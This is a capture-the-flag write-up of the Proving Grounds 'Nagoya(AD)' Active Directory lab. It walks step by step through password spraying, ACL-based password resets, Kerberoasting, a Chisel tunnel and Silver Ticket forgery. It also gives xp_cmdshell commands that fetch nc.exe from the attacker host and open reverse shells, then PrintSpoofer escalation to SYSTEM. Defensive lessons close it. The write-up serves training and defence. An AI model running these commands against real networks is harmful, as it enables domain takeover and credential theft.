# Nagoya(AD) — Proving Grounds Writeup

**Platform:** Proving Grounds Practice

**OS:** Windows Server (Active Directory)

**Domain:** `nagoya-industries.com`

**Difficulty:** Hard

**Tags:** OSINT · Username Enumeration · Password Spraying · BloodHound · GenericAll Abuse · Kerberoasting · Silver Ticket · Chisel Port Forwarding · MSSQL RCE · SeImpersonatePrivilege · PrintSpoofer

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [OSINT — Employee Enumeration from Web](#osint--employee-enumeration-from-web)
4. [Username Generation & Validation](#username-generation--validation)
5. [Password Spraying](#password-spraying)
6. [BloodHound AD Enumeration](#bloodhound-ad-enumeration)
7. [GenericAll Privilege Chain — Password Reset](#genericall-privilege-chain--password-reset)
8. [WinRM Access — christopher.lewis](#winrm-access--christopherlewis)
9. [Kerberoasting — svc_mssql](#kerberoasting--svc_mssql)
10. [Port Forwarding — Chisel MSSQL Tunnel](#port-forwarding--chisel-mssql-tunnel)
11. [Silver Ticket Attack — MSSQL Impersonation](#silver-ticket-attack--mssql-impersonation)
12. [MSSQL RCE — Reverse Shell via xp_cmdshell](#mssql-rce--reverse-shell-via-xp_cmdshell)
13. [Privilege Escalation — SeImpersonatePrivilege + PrintSpoofer](#privilege-escalation--seimpersonateprivilege--printspoofer)
14. [Flags](#flags)
15. [Attack Chain](#-attack-chain)
16. [Skills Demonstrated](#-skills-demonstrated)
17. [Lessons Learned](#-lessons-learned)
18. [References](#references)

---

## Lab Overview

> *"Nagoya(AD) is a hard-rated Active Directory lab requiring a full multi-stage attack chain: web OSINT → credential spraying → BloodHound analysis → ACL abuse → Kerberoasting → port tunneling → Silver Ticket → MSSQL RCE → privilege escalation via SeImpersonatePrivilege."*

**Key Objectives:**
- Harvest employee names from the company website and generate domain username candidates
- Validate users via Kerbrute and perform seasonal password spraying
- Use BloodHound to map AD ACL misconfigurations and exploit a GenericAll privilege chain
- Kerberoast service accounts to recover `svc_mssql` credentials
- Forward the internal MSSQL port via Chisel and forge a Silver Ticket to impersonate Administrator
- Gain SYSTEM via MSSQL `xp_cmdshell` → SeImpersonatePrivilege → PrintSpoofer

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.144.21
```

<img width="1155" height="776" alt="image" src="https://github.com/user-attachments/assets/bd9f26ed-d0db-4297-8953-d1e2bbdaefa6" />


**Ports Discovered:**

| Port | State | Service | Notes |
|------|-------|---------|-------|
| 53 | open | DNS | Simple DNS Plus |
| 80 | open | HTTP | Microsoft IIS 10.0 — **Nagoya Industries** |
| 88 | open | Kerberos | Microsoft Windows Kerberos |
| 135 | open | msrpc | Microsoft Windows RPC |
| 139 | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 464 | open | kpasswd5 | Kerberos password change |
| 593 | open | ncacn_http | RPC over HTTP 1.0 |
| 3268 | open | LDAP | AD LDAP — `Domain: nagoya-industries.com` |
| 3269 | open | LDAPS | Global Catalog SSL |
| 5985 | open | WinRM | Microsoft HTTPAPI 2.0 |
| 49668+ | open | msrpc | Dynamic RPC |

**Key Nmap Findings:**
- Domain: **nagoya-industries.com**
- NetBIOS Name: **NAGOYA-IND** / Computer: **NAGOYA**
- Product Version: **10.0.17763** (Windows Server 2019)
- WinRM available on port 5985 — potential lateral movement target
- This is a **Domain Controller**

### /etc/hosts Update

```bash
echo "192.168.144.21 nagoya-industries.com nagoya" | sudo tee -a /etc/hosts
```

<img width="644" height="258" alt="image" src="https://github.com/user-attachments/assets/dbdcbf75-5b7a-47e2-8f1b-5c6f93989f05" />


---

## OSINT — Employee Enumeration from Web

### Port 80 — Nagoya Industries Website

Visiting `http://192.168.144.21` reveals the **Nagoya Industries** company website — a fishing company operating for over 50 years.

**Screenshot — Nagoya Industries Homepage:**

<img width="1472" height="920" alt="image" src="https://github.com/user-attachments/assets/40abd2cd-c5c0-4711-ad7b-d8c13033aafc" />


### Employee Name Harvesting

The website exposes a **Team** page listing employee full names — a critical OSINT finding for username generation:

**Screenshot — Employee Team Page:**

<img width="1164" height="736" alt="image" src="https://github.com/user-attachments/assets/2117c9e1-d335-42ef-9342-8cc47c74229b" />


**Employees harvested:**

```
Matthew Harrison    Emma Miah         Rebecca Bell
Scott Gardner       Terry Edwards     Holly Matthews
Anne Jenkins        Brett Naylor      Melissa Mitchell
Craig Carr          Fiona Clark       Patrick Martin
Kate Watson         Kirsty Norris     Andrea Hayes
Abigail Hughes      Melanie Watson    Frances Ward
Sylvia King         Wayne Hartley     Iain White
Joanna Wood         Bethan Webster    Elaine Brady
Christopher Lewis   Megan Johnson     Damien Chapman
Joanne Lewis
```

Save to file:

```bash
nano nagoya_user.txt
# Paste all employee names, one per line
```

<img width="406" height="571" alt="image" src="https://github.com/user-attachments/assets/33cecd55-c3e9-409f-8221-dd9176c2f80e" />


---

## Username Generation & Validation

### Username-Anarchy — Generate All Format Variants

Domain username formats are unknown. Generate every possible variant using `username-anarchy`:

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy -i nagoya_user.txt > domain-users.txt
```

<img width="788" height="198" alt="image" src="https://github.com/user-attachments/assets/f8109f0c-5034-40dd-963b-06a202d9c885" />


Sample output formats generated:
```
matthew, matthewharrison, matthew.harrison, matthewh, mattharr,
m.harrison, mharrison, emma, emma.miah, emmam, e.miah ...
```

### Kerbrute — Validate Valid Domain Users

```bash
kerbrute userenum --dc 192.168.144.21 -d nagoya-industries.com domain-users.txt
```

<img width="1059" height="615" alt="image" src="https://github.com/user-attachments/assets/b77857bd-d71d-40de-bca6-0178ab1c27a5" />


```
2025/08/30 17:32:31 > Using KDC(s): 192.168.144.21:88
2025/08/30 17:32:32 > Done! Tested 405 usernames (28 valid) in 1.202 seconds
```

**28 valid users confirmed.** Format identified: `firstname.lastname`

Create refined user list:

```bash
nano user2.txt
```

```
matthew.harrison    emma.miah         rebecca.bell
scott.gardner       terry.edwards     holly.matthews
anne.jenkins        brett.naylor      melissa.mitchell
craig.carr          fiona.clark       patrick.martin
kate.watson         kirsty.norris     andrea.hayes
abigail.hughes      melanie.watson    frances.ward
sylvia.king         wayne.hartley     iain.white
joanna.wood         bethan.webster    elaine.brady
christopher.lewis   megan.johnson     damien.chapman
joanne.lewis
```

<img width="627" height="605" alt="image" src="https://github.com/user-attachments/assets/686e5ae2-f4a3-419f-99a8-e4d010b49b97" />


---

## Password Spraying

### Craft Season-Based Passwords

The website footer shows **© 2023 - Nagoya**. Common enterprise password patterns use company name + year or season + year:

```
Summer2023
Nagoya2023
```

### CrackMapExec Password Spray

```bash
crackmapexec smb 192.168.144.21 -u user2.txt -p Summer2023
crackmapexec smb 192.168.144.21 -u user2.txt -p Nagoya2023
```

<img width="1130" height="139" alt="image" src="https://github.com/user-attachments/assets/638afddc-3a98-4582-a575-a0700fdefbe2" />
<img width="1004" height="101" alt="image" src="https://github.com/user-attachments/assets/b2d92c73-7a24-47f9-95a5-4a47092bcb56" />



**Valid credentials found:**

```
andrea.hayes  : Nagoya2023   ✅
fiona.clark   : Summer2023   ✅
```

---

## BloodHound AD Enumeration

### Collect AD Data with bloodhound-python

```bash
bloodhound-python \
  -u andrea.hayes \
  -p Nagoya2023 \
  -ns 192.168.144.21 \
  -d nagoya-industries.com \
  -c all
```

<img width="1601" height="611" alt="image" src="https://github.com/user-attachments/assets/c06321a8-27d1-43c7-889e-7ed0fd16c1cb" />


Zip and import into BloodHound:

```bash
zip -r nagoya_bh.zip *.json
# Import into BloodHound GUI
```

### BloodHound Graph Analysis

<img width="1390" height="320" alt="image" src="https://github.com/user-attachments/assets/cd68a2f6-8a91-479b-83fa-040701902375" />
<img width="1210" height="307" alt="image" src="https://github.com/user-attachments/assets/dd49a52d-2306-44f2-9532-fbbcb7ce135c" />
<img width="1391" height="341" alt="image" src="https://github.com/user-attachments/assets/8ee62d0e-b34b-4e70-b3db-e70af1b3d686" />
<img width="1636" height="332" alt="image" src="https://github.com/user-attachments/assets/15f25683-57f1-4a85-8df7-fbd1e3eee105" />
<img width="1073" height="630" alt="image" src="https://github.com/user-attachments/assets/41d4398d-edfd-48be-b304-d263e95a5cb7" />
<img width="1140" height="384" alt="image" src="https://github.com/user-attachments/assets/f61995fa-9467-40c7-8ed4-4834b2397b47" />



**Critical ACL Privilege Chain Discovered:**

```
fiona.clark
    └─ MemberOf → EMPLOYEES group
            └─ GenericAll → svc_helpdesk
                    └─ GenericAll → christopher.lewis
                            └─ MemberOf → REMOTE MANAGEMENT USERS
                                    └─ Can WinRM to DC ✅
```

> **Attack path:** Use `fiona.clark`'s group membership to reset `svc_helpdesk` password → then use `svc_helpdesk`'s GenericAll to reset `christopher.lewis` password → WinRM into DC.

---

## GenericAll Privilege Chain — Password Reset

### Step 1 — Reset svc_helpdesk Password via fiona.clark

```bash
rpcclient -U "fiona.clark%Summer2023" 192.168.144.21
rpcclient $> setuserinfo2 svc_helpdesk 23 Password1
```

<img width="585" height="138" alt="image" src="https://github.com/user-attachments/assets/83c3c10a-4473-4fef-8e10-a8dcb2f32a7a" />


### Step 2 — Reset christopher.lewis Password via svc_helpdesk

```bash
rpcclient -U "svc_helpdesk%Password1" 192.168.144.21
rpcclient $> setuserinfo2 christopher.lewis 23 Password1
```

<img width="696" height="159" alt="image" src="https://github.com/user-attachments/assets/646dc6f8-284b-49e5-bc5c-b6cf81f002b9" />


**Credential chain established:**

```
fiona.clark:Summer2023 → svc_helpdesk:Password1 → christopher.lewis:Password1
```

---

## WinRM Access — christopher.lewis

### Evil-WinRM Login

```bash
evil-winrm -i 192.168.144.21 -u christopher.lewis -p Password1
```

<img width="1108" height="289" alt="image" src="https://github.com/user-attachments/assets/ea77c2df-b5db-44a7-a703-25fa6b059c94" />
<img width="1377" height="359" alt="image" src="https://github.com/user-attachments/assets/23a2419f-bdec-4697-88e3-ea7e6e7109aa" />


```
C:\Users\christopher.Lewis\Documents>
```

Shell obtained as `christopher.lewis`. Access to Administrator and svc_mssql home directories is denied — need further escalation.

---

## Kerberoasting — svc_mssql

### Identify Kerberoastable Service Accounts

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  -dc-ip 192.168.144.21 \
  nagoya-industries.com/fiona.clark:Summer2023
```

<img width="1434" height="224" alt="image" src="https://github.com/user-attachments/assets/99025e1b-663b-4266-8410-5e7c03ae12e8" />


**SPNs found:**

| SPN | User Account | Notes |
|-----|-------------|-------|
| `http/nagoya.nagoya-industries.com` | svc_helpdesk | Password already known |
| `mssql/nagoya.nagoya-industries.com` | **svc_mssql** | Target — MSSQL service account |

### Request and Save TGS Hashes

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  -dc-ip 192.168.144.21 \
  nagoya-industries.com/fiona.clark:Summer2023 \
  -request \
  -outputfile svc_hash
```

<img width="1600" height="564" alt="image" src="https://github.com/user-attachments/assets/ccd2037f-0987-4e46-a250-1a4425681759" />


### Crack Hashes with Hashcat

```bash
hashcat -m 13100 svc_hash /usr/share/wordlists/rockyou.txt
```
<img width="1628" height="483" alt="image" src="https://github.com/user-attachments/assets/2c09b286-2548-4aa7-9a78-ce175a7707f3" />


**Cracked credentials:**

```
svc_helpdesk : Password1   (confirms our earlier reset)
svc_mssql    : Service1    ✅ (new credential)
```

---

## Port Forwarding — Chisel MSSQL Tunnel

### MSSQL Port 1433 Not Exposed Externally

Check MSSQL from the christopher.lewis WinRM shell:

```powershell
netstat -ano | Select-String "1433"
```

<img width="733" height="155" alt="image" src="https://github.com/user-attachments/assets/625b32e5-d857-411e-a84b-3dd5f9bf781b" />


```
TCP  0.0.0.0:1433   0.0.0.0:0   LISTENING   3612
```

Port 1433 is listening but firewalled externally. Use Chisel to tunnel it.

### Setup Chisel Reverse Tunnel

**Attacker machine:**

```bash
chisel server --socks5 --reverse -p 139
```

<img width="742" height="133" alt="image" src="https://github.com/user-attachments/assets/fc5c279b-08b2-475c-ad78-c9bc4ae0de3a" />


**Transfer Chisel to target (via christopher.lewis WinRM):**

```bash
# Attacker: host the binary
cd /home/kali/Desktop/chisel_1.10.1_windows_amd64
python3 -m http.server 8000
```

```cmd
# Target (WinRM shell):
certutil -urlcache -f http://192.168.45.158:8000/chisel.exe chisel.exe
```

<img width="702" height="239" alt="image" src="https://github.com/user-attachments/assets/70678252-face-4325-bcfc-c37f618bc94e" />
<img width="1115" height="116" alt="image" src="https://github.com/user-attachments/assets/375987cf-f54f-4d8e-92df-873eee8abca9" />


**Connect back and forward port 1433:**

```cmd
cmd /c "chisel client 192.168.45.158:139 R:1433:127.0.0.1:1433"
```

**Screenshot — Chisel Client Connected:**

<img width="1312" height="147" alt="image" src="https://github.com/user-attachments/assets/59b9cd2a-e208-4c95-98aa-c73934aeff2f" />


### Verify Tunnel

```bash
nmap 127.0.0.1 -p 1433
```

<img width="657" height="211" alt="image" src="https://github.com/user-attachments/assets/f5a22a19-dac7-479c-b7ed-4e53b9c570d8" />


```
PORT     STATE  SERVICE
1433/tcp open   ms-sql-s
```

---

## Silver Ticket Attack — MSSQL Impersonation

### Initial MSSQL Connection (Insufficient Privileges)

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  svc_mssql:Service1@127.0.0.1 -windows-auth
```

<img width="1056" height="288" alt="image" src="https://github.com/user-attachments/assets/e3962787-9983-441a-8b57-3323f497a0fe" />


```sql
SQL (NAGOYA-IND\svc_mssql guest@master)> enable_xp_cmdshell
ERROR: User does not have permission to perform this action.
```

`svc_mssql` lacks SA privileges — cannot enable `xp_cmdshell`. Need to forge a **Silver Ticket** to impersonate Administrator.

### Gather Required Silver Ticket Ingredients

**1 — Get Domain SID (from christopher.lewis WinRM):**

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

<img width="1302" height="546" alt="image" src="https://github.com/user-attachments/assets/a8238f6a-718b-406b-97d7-06b89d103f96" />


```
Domain SID   : S-1-5-21-1969309164-1513403977-1686805993
SPN Target   : MSSQL/nagoya.nagoya-industries.com
User-ID 500  : Administrator
```

**2 — Convert svc_mssql Password to NTLM Hash:**

```bash
echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
```

<img width="673" height="84" alt="image" src="https://github.com/user-attachments/assets/54ab9b47-2930-4916-aba9-4162af1d9b67" />


```
MD4(stdin) = e3a0168bc21cfb88b95c954a5b18f57c
```

### Forge the Silver Ticket

```bash
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
  -nthash e3a0168bc21cfb88b95c954a5b18f57c \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn MSSQL/nagoya.nagoya-industries.com \
  -user-id 500 \
  Administrator
```
<img width="1391" height="348" alt="image" src="https://github.com/user-attachments/assets/26e8a202-198c-4965-98f3-d05c77d66ff4" />


```
[*] Creating basic skeleton ticket and PAC Infos
[+] Customizing ticket for nagoya-industries.com/Administrator
[+] PAC_LOGON_INFO
[+] Signing/encrypting final ticket
```

### Export ccache and Configure Kerberos

```bash
export KRB5CCNAME=/root/Desktop/nagoya/Administrator.ccache
```

**Configure /etc/krb5.conf:**

```bash
apt install krb5-user
nano /etc/krb5.conf
```

```ini
[libdefaults]
    default_realm = NAGOYA-INDUSTRIES.COM
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    rdns = false
    fcc-mit-ticketflags = true

[realms]
    NAGOYA-INDUSTRIES.COM = {
        kdc = nagoya.nagoya-industries.com
    }

[domain_realm]
    .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

### Connect as Administrator via Kerberos

Update `/etc/hosts` to point `nagoya.nagoya-industries.com` to `127.0.0.1` (tunneled port):

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  -k nagoya.nagoya-industries.com
```

**Screenshot — MSSQL Connected as Administrator via Silver Ticket:**

<img width="1192" height="472" alt="image" src="https://github.com/user-attachments/assets/acdf50ee-0191-422a-a351-0b61729d695c" />


```
SQL (NAGOYA-IND\Administrator dbo@master)>
```

---

## MSSQL RCE — Reverse Shell via xp_cmdshell

### Enable xp_cmdshell

```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell "whoami /priv"
```

<img width="1367" height="704" alt="image" src="https://github.com/user-attachments/assets/1e45ad69-e465-4a20-8126-5a6652a60004" />


Key privilege noted: **SeImpersonatePrivilege** — `Enabled`

### Upload nc.exe and Get Reverse Shell

**Host nc.exe on attacker:**

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80
```

**Download nc.exe via xp_cmdshell:**

```sql
SQL> xp_cmdshell "curl http://192.168.45.158/nc.exe -o c:\temp\nc.exe"
```

<img width="1175" height="317" alt="image" src="https://github.com/user-attachments/assets/84d78266-4846-4b9f-85d4-06ca8f5ccbec" />


**Trigger reverse shell:**

```sql
SQL> xp_cmdshell "c:\temp\nc.exe 192.168.45.158 445 -e cmd.exe"
```

**Listener on attacker:**

```bash
rlwrap nc -lv 445
```

<img width="626" height="294" alt="image" src="https://github.com/user-attachments/assets/66c75cf1-bbb8-4f03-8fbc-c9b9a4d6ae21" />


```
C:\Windows\system32> whoami
nagoya-ind\svc_mssql
```

---

## Privilege Escalation — SeImpersonatePrivilege + PrintSpoofer

### Confirm SeImpersonatePrivilege

```cmd
whoami /priv
```

<img width="1369" height="765" alt="image" src="https://github.com/user-attachments/assets/fe365fe8-b460-4ea5-8ab8-e67cd8d5724b" />


```
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

### Upload PrintSpoofer.exe

```bash
# Attacker — already serving HTTP:
python3 -m http.server 80
```

```cmd
# Target shell:
curl http://192.168.45.158/PrintSpoofer.exe -o c:\temp\PrintSpoofer.exe
```

<img width="1727" height="584" alt="image" src="https://github.com/user-attachments/assets/ee05fc06-5920-474f-8368-67e83ce7f242" />
<img width="1694" height="320" alt="image" src="https://github.com/user-attachments/assets/a56bbf2c-b297-431c-8b4e-3377a8c177a5" />


### Execute PrintSpoofer → SYSTEM Shell

```bash
# Attacker listener:
rlwrap nc -lvnp 8000
```

```cmd
# Target:
PrintSpoofer.exe -c "nc.exe 192.168.45.158 8000 -e cmd"
```

<img width="1666" height="161" alt="image" src="https://github.com/user-attachments/assets/7c75c4ac-f276-454c-a60d-2d0eec1180f9" />


```
C:\Windows\system32> whoami
nt authority\system
```

**Full SYSTEM access confirmed!**

---

## Flags

### local.txt

After priv escalation, connect via `evil-winrm` as `christopher.lewis` to retrieve local.txt:


```bash
evil-winrm -i 192.168.144.21 -u christopher.lewis -p Password1
```

```
59b8da150907e35a129a6262f183a418
```
<img width="727" height="170" alt="image" src="https://github.com/user-attachments/assets/589ba870-f4ef-41b0-a202-ceb919eb3b22" />

### proof.txt

```
C:\Users\Administrator\Desktop> type proof.txt
0ec1436eb37fb7ef3b86e973e9090c6
```

<img width="805" height="289" alt="image" src="https://github.com/user-attachments/assets/8e0c542e-9851-45a1-a351-d0f2e45c3952" />


---

## 🗺️ Attack Chain

```
Target: 192.168.144.21 | Domain: nagoya-industries.com
│
├── [Reconnaissance] nmap -sC -sV -sS -A -T5 -p- -Pn
│       ├── Port 80:   IIS — Nagoya Industries website
│       ├── Port 88:   Kerberos — Domain Controller confirmed
│       ├── Port 3268: LDAP — nagoya-industries.com
│       ├── Port 5985: WinRM — potential access vector
│       └── /etc/hosts → 192.168.144.21 nagoya-industries.com nagoya
│
├── [OSINT] Web Employee Harvesting
│       ├── Team page → 28 employee full names extracted
│       └── nagoya_user.txt created
│
├── [Username Enumeration] username-anarchy + kerbrute
│       ├── username-anarchy → 400+ format variants generated
│       ├── kerbrute userenum → 28 valid users confirmed
│       └── Format identified: firstname.lastname
│               └── user2.txt (28 valid domain accounts)
│
├── [Password Spraying] CrackMapExec
│       ├── Passwords: Summer2023, Nagoya2023 (from site copyright)
│       ├── andrea.hayes:Nagoya2023    ✅
│       └── fiona.clark:Summer2023     ✅
│
├── [BloodHound] Domain Enumeration
│       ├── bloodhound-python -u andrea.hayes -p Nagoya2023 -c all
│       └── ACL chain discovered:
│               fiona.clark (EMPLOYEES)
│                   → GenericAll → svc_helpdesk
│                       → GenericAll → christopher.lewis
│                           → REMOTE MANAGEMENT USERS (WinRM to DC)
│
├── [ACL Abuse] GenericAll Password Reset Chain
│       ├── rpcclient fiona.clark → setuserinfo2 svc_helpdesk → Password1
│       ├── rpcclient svc_helpdesk → setuserinfo2 christopher.lewis → Password1
│       └── evil-winrm christopher.lewis:Password1 → DC shell
│
├── [Kerberoasting] TGS Hash Capture + Crack
│       ├── GetUserSPNs.py → svc_mssql (mssql/nagoya) + svc_helpdesk
│       ├── hashcat -m 13100 svc_hash rockyou.txt
│       └── svc_mssql:Service1    ✅
│
├── [Port Forwarding] Chisel Reverse Tunnel
│       ├── Port 1433 internal only (firewalled externally)
│       ├── Attacker: chisel server --socks5 --reverse -p 139
│       ├── Target: certutil → chisel.exe → client connect
│       └── R:1433:127.0.0.1:1433 → MSSQL now on localhost:1433
│
├── [Silver Ticket Attack] MSSQL Administrator Impersonation
│       ├── svc_mssql:Service1 → cannot enable xp_cmdshell (no SA perms)
│       ├── NTLM: echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
│       │           → e3a0168bc21cfb88b95c954a5b18f57c
│       ├── ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -spn MSSQL/... Administrator
│       ├── export KRB5CCNAME=Administrator.ccache
│       └── mssqlclient.py -k nagoya.nagoya-industries.com → Admin SQL session
│
├── [MSSQL RCE] xp_cmdshell → Reverse Shell
│       ├── enable_xp_cmdshell → SUCCESS (as Administrator)
│       ├── xp_cmdshell "curl ... nc.exe -o c:\temp\nc.exe"
│       ├── xp_cmdshell "c:\temp\nc.exe 192.168.45.158 445 -e cmd.exe"
│       └── Shell received as: nagoya-ind\svc_mssql$
│               └── SeImpersonatePrivilege: ENABLED
│
└── [Privilege Escalation] PrintSpoofer → SYSTEM
        ├── Upload PrintSpoofer.exe + nc.exe
        ├── PrintSpoofer.exe -c "nc.exe 192.168.45.158 8000 -e cmd"
        └── NT AUTHORITY\SYSTEM ✅
                ├── local.txt:  59b8da150907e35a129a6262f183a418
                └── proof.txt:  0ec1436eb37fb7ef3b86e973e9090c6
```

---

## 🛡️ Skills Demonstrated

| Skill | Application | MITRE ATT&CK |
|-------|-------------|--------------|
| **Network Reconnaissance** | nmap full port scan identifying full AD service stack | T1046 — Network Service Scanning |
| **OSINT & Web Enumeration** | Harvested 28 employee names from company website Team page | T1591.004 — Employee Identification |
| **Username Generation** | Generated 400+ AD username format variants with username-anarchy | T1078.002 — Domain Accounts |
| **User Enumeration (Kerberos)** | Validated valid domain accounts via Kerbrute AS-REQ | T1110.004 — Credential Stuffing |
| **Password Spraying** | Seasonal/company-themed passwords against 28 domain accounts | T1110.003 — Password Spraying |
| **Active Directory Enumeration** | Full domain enumeration with bloodhound-python | T1087.002 — Domain Account Discovery |
| **BloodHound ACL Analysis** | Identified and mapped 3-hop GenericAll privilege chain | T1069.002 — Domain Groups |
| **ACL Abuse — GenericAll** | Used rpcclient to reset passwords via GenericAll rights | T1484.001 — Group Policy Modification |
| **WinRM Lateral Movement** | evil-winrm access to DC using reset credentials | T1021.006 — Windows Remote Management |
| **Kerberoasting** | Requested and cracked TGS tickets for service accounts | T1558.003 — Kerberoasting |
| **Port Forwarding (Chisel)** | Tunneled internal MSSQL port 1433 to attacker machine | T1572 — Protocol Tunneling |
| **Silver Ticket Attack** | Forged Kerberos ticket to impersonate Administrator for MSSQL | T1558.002 — Silver Ticket |
| **MSSQL Exploitation** | Enabled xp_cmdshell as impersonated Administrator for OS commands | T1505 — Server Software Component |
| **SeImpersonatePrivilege Abuse** | Identified impersonation privilege on service account | T1134.001 — Token Impersonation |
| **PrintSpoofer Privilege Escalation** | Leveraged SeImpersonatePrivilege to escalate to SYSTEM | T1068 — Exploitation for Privilege Escalation |
| **Penetration Testing Methodology** | Full AD attack chain across 10+ distinct techniques | — |

---

## 📚 Lessons Learned

### 🔴 For Attackers (Pentesters)

- **Company websites are AD intelligence goldmines.** A Team/About Us page with full employee names gives you a ready-made username list. Always check every page of a target's web presence before touching the network.
- **Username-anarchy is essential for AD engagements.** Real domains use dozens of naming conventions (`j.smith`, `jsmith`, `john.smith`, `smithj`). Never hand-craft usernames — generate all variants and validate.
- **Seasonal password spraying works.** `Company2023`, `Summer2023`, `Winter2024` are used everywhere. Spray carefully (1 password per day max to avoid lockouts) and check the copyright year on the website for hints.
- **BloodHound is non-negotiable for AD.** The GenericAll chain here was 3 hops deep — impossible to spot manually. Always run bloodhound-python as soon as you have valid credentials.
- **ACL chains are often the shortest path to DA.** GenericAll → password reset is one of the most common privesc paths in real AD environments. Understand and actively look for: GenericAll, GenericWrite, WriteOwner, WriteDACL, AllExtendedRights.
- **Service accounts that can't be reached externally might be reachable internally.** MSSQL on port 1433 was firewalled externally but listening internally — always check `netstat` after getting an initial shell.
- **Silver Ticket = MSSQL access without KDC.** A Silver Ticket abuses the fact that MSSQL validates service tickets locally, not via the KDC. Having the service account's NTLM hash is all you need — the DC doesn't even log the authentication.
- **SeImpersonatePrivilege on a service account is almost always a guaranteed SYSTEM.** Check `whoami /priv` immediately after every new shell — any `Se*Privilege` that is enabled is a potential escalation path.

### 🔵 For Defenders

- **Remove employee names from public-facing websites.** A Team page is a free username wordlist for attackers. If publishing employee names is required, use first names only or implement anti-scraping measures.
- **Enforce a strong password policy with complexity AND history.** Seasonal passwords like `Summer2023` or `Nagoya2023` pass most complexity checks but fall to simple sprays. Require passphrases of 16+ characters.
- **Implement AD account lockout thresholds.** Password spraying works because most environments have no lockout after a few failed attempts. A threshold of 3-5 failures with 30-minute lockout stops spraying cold.
- **Regularly audit ACL permissions in Active Directory.** GenericAll on a user account is a critical misconfiguration. Use BloodHound or PingCastle in defense mode to find and remediate these paths before attackers do.
- **Apply least privilege to service accounts.** `svc_mssql` should not have `SeImpersonatePrivilege`. Windows service accounts running SQL Server should be Managed Service Accounts (MSA) with auto-rotating passwords.
- **Use Group Managed Service Accounts (gMSA) for service accounts.** gMSA passwords are 240 characters, automatically rotated, and not directly Kerberoastable. Replace all SPN-bearing user accounts with gMSAs.
- **Firewall internal services at the host level.** MSSQL should not bind to `0.0.0.0:1433` — restrict to specific IP addresses that legitimately need access, enforced via Windows Firewall.
- **Monitor for Kerberos Silver Ticket indicators.** Silver Tickets produce TGS tickets without a corresponding TGT — anomalous Kerberos events without prior AS-REQ can indicate Silver Ticket attacks. Alert on Event ID 4769 without prior 4768.
- **Disable xp_cmdshell by default.** SQL Server's `xp_cmdshell` should never be enabled in production. If MSSQL is required, disable surface area components and enforce a least-privilege SQL login.
- **Monitor for rpcclient password change activity.** `setuserinfo2` calls via RPC are a known ACL abuse technique. Log and alert on password changes that do not come from standard IT change management processes.

### 🟡 Key Vulnerabilities Summary

| Vulnerability | Root Cause | Severity | Impact | Mitigation |
|---------------|-----------|----------|--------|-----------|
| **Employee OSINT Exposure** | Full names published on website | Medium | Username enumeration for spraying | Remove employee listings; use CAPTCHA |
| **Weak Seasonal Passwords** | No password complexity enforcement | High | Domain credential compromise | Enforce strong policy; MFA on all accounts |
| **GenericAll ACL Misconfiguration** | Over-privileged group permissions | Critical | Full privilege chain to DC WinRM | Audit and remove excessive ACL permissions |
| **Kerberoastable Service Accounts** | SPN on user accounts with weak passwords | High | Offline hash cracking of svc_mssql | Use gMSA; enforce 25+ char service passwords |
| **Internal MSSQL Exposed** | Listening on 0.0.0.0 internally | High | Pivotable via port tunneling | Restrict MSSQL binding; host-based firewall |
| **Silver Ticket Vulnerability** | Service ticket validated locally | Critical | Admin impersonation without KDC logs | Protected Users group; PAC validation |
| **xp_cmdshell Available** | SQL Server feature not hardened | Critical | OS command execution from MSSQL | Disable xp_cmdshell; restrict SA role |
| **SeImpersonatePrivilege on svc_mssql** | Service account over-privileged | Critical | SYSTEM via PrintSpoofer | Use gMSA; remove unnecessary privileges |

---

## References

- [BloodHound — AD Attack Path Analysis](https://github.com/BloodHoundAD/BloodHound)
- [Impacket — GetUserSPNs.py (Kerberoasting)](https://github.com/fortra/impacket)
- [Impacket — ticketer.py (Silver Ticket)](https://github.com/fortra/impacket)
- [Chisel — Fast TCP/UDP Tunneling](https://github.com/jpillora/chisel)
- [PrintSpoofer — SeImpersonatePrivilege Exploit](https://github.com/itm4n/PrintSpoofer)
- [Username-Anarchy — Username Generation](https://github.com/urbanadventurer/username-anarchy)
- [MITRE ATT&CK — T1558.002: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
- [MITRE ATT&CK — T1558.003: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK — T1110.003: Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
- [Nagoya Writeup Reference — Medium](https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service fingerprinting |
| `username-anarchy` | Domain username format generation |
| `kerbrute` | Domain user account enumeration via Kerberos |
| `crackmapexec` | SMB password spraying |
| `bloodhound-python` | Active Directory ACL and path enumeration |
| `rpcclient` | Password reset via GenericAll ACL abuse |
| `evil-winrm` | WinRM lateral movement to DC |
| `GetUserSPNs.py` | Kerberoasting — TGS hash capture |
| `hashcat` | Offline hash cracking (Kerberos mode 13100) |
| `chisel` | Reverse TCP port forwarding tunnel |
| `mssqlclient.py` | MSSQL client (Impacket) |
| `ticketer.py` | Silver Ticket forging (Impacket) |
| `openssl md4` | NTLM hash generation from plaintext |
